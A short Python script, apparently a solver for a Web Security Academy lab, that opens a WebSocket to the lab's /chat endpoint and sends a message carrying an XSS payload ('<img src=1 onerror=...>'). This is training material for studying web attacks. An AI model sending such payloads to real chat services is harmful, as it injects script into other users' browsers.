from web_security_academy.core.logger import logger
from websockets.sync.client import connect
from urllib.parse import urlparse

import json
import time


def solve_lab(session):
    hostname = urlparse(session.url).hostname
    payload = json.dumps({"message": "<img src=1 onerror='alert(1)'>"})

    with connect(f"wss://{hostname}/chat") as websocket:
        websocket.send(payload)
        websocket.recv()
        logger.info(f"Sent the following payload: {payload}")
        time.sleep(1)
